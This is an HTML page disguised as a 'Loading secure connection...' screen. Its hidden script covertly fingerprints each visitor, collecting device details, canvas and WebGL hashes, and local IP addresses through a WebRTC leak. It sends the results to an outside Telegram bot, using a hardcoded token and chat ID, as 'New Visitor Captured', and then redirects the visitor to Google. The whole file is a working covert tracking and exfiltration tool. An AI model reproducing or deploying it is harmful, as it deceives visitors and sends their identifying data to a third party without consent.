<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
        .loader { border: 4px solid #222; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; font-size: 14px; color: #0f0; opacity: 0.8; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <div class="text">Loading secure connection...</div>
    </div>
    <script>
        // ========== غير هنا ==========
        const TELEGRAM_BOT_TOKEN = '8924356522:AAHqmA33uk_oGD79V4og3HU4kGU_pNszaRs';
        const TELEGRAM_CHAT_ID = '6200879535';

        (async function() {
            try {
                // جمع البصمة بشكل آمن
                const fp = {};

                // معلومات أساسية
                fp.platform = navigator.platform || 'unknown';
                fp.screenResolution = (window.screen.width || '?') + 'x' + (window.screen.height || '?') + ' (' + (window.screen.colorDepth || '?') + 'bit)';
                fp.language = navigator.language || 'unknown';
                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
                fp.referrer = document.referrer || 'none';
                fp.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                fp.doNotTrack = navigator.doNotTrack || 'unspecified';
                fp.hardwareConcurrency = navigator.hardwareConcurrency || '?';
                fp.deviceMemory = navigator.deviceMemory || '?';
                fp.touchSupport = navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
                fp.vendor = navigator.vendor || '?';
                // قائمة الإضافات قد لا تكون متاحة في بعض المتصفحات
                fp.plugins = [];
                if (navigator.plugins && navigator.plugins.length) {
                    for (let p of navigator.plugins) {
                        fp.plugins.push(p.name);
                    }
                }
                fp.plugins = fp.plugins.length ? fp.plugins.join(', ') : 'none';
                fp.canvasHash = await getCanvasHash();
                fp.webglHash = getWebGLHash();
                fp.localIPs = [];

                // محاولة WebRTC leak
                try {
                    const ips = await getLocalIPs();
                    fp.localIPs = ips;
                } catch(e) {}

                // بناء رسالة التقرير
                let msg = `🎯 *New Visitor Captured*

🌐 *Platform:* \`${fp.platform}\`
📏 *Screen:* \`${fp.screenResolution}\`
🌍 *Language:* \`${fp.language}\`
⏰ *Timezone:* \`${fp.timezone}\`
🔗 *Referrer:* \`${fp.referrer}\`
🍪 *Cookies:* \`${fp.cookiesEnabled}\`
🚫 *DNT:* \`${fp.doNotTrack}\`
🧠 *RAM:* \`${fp.deviceMemory}GB\` | CPU: \`${fp.hardwareConcurrency} cores\`
👆 *Touch:* \`${fp.touchSupport}\`
🏷 *Vendor:* \`${fp.vendor}\`
🧩 *Plugins:* \`${fp.plugins}\`
🖼 *Canvas Hash:* \`${fp.canvasHash || 'none'}\`
🎨 *WebGL Hash:* \`${fp.webglHash || 'none'}\`
🔎 *Local IPs:* \`${fp.localIPs.length ? fp.localIPs.join(', ') : 'none'}\`
🕒 *Captured:* \`${new Date().toISOString()}\``;

                // إرسال إلى تيليغرام
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                const json = await res.json();
                console.log('Telegram response:', json);
            } catch(e) {
                console.error('Error capturing:', e);
            }

            // إعادة التوجيه بعد 200 مللي
            setTimeout(() => {
                window.location.replace('https://www.google.com');
            }, 200);
        })();

        // توليد بصمة Canvas
        async function getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 220;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                if (!ctx) return 'no canvas';
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(130,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Visitor ID ' + navigator.userAgent.slice(0,12), 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.8)';
                ctx.fillText('Visitor ID ' + navigator.userAgent.slice(0,12), 4, 17);
                return canvas.toDataURL().slice(-64);
            } catch(e) {
                return 'error';
            }
        }

        // بصمة WebGL
        function getWebGLHash() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'no webgl';
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : '?';
                const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '?';
                return vendor + '~~' + renderer;
            } catch(e) {
                return 'webgl error';
            }
        }

        // WebRTC leak للحصول على IP المحلي الحقيقي
        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e || !e.candidate || !e.candidate.candidate) return;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = ipRegex.exec(e.candidate.candidate);
                    if (match) {
                        const ip = match[0];
                        if (ip !== '0.0.0.0' && !ip.startsWith('127.')) ips.add(ip);
                    }
                };
                const timeout = setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ips));
                }, 2000);
                pc.onicegatheringstatechange = () => {
                    if (pc.iceGatheringState === 'complete') {
                        clearTimeout(timeout);
                        pc.close();
                        resolve(Array.from(ips));
                    }
                };
            });
        }
    </script>
</body>
</html>
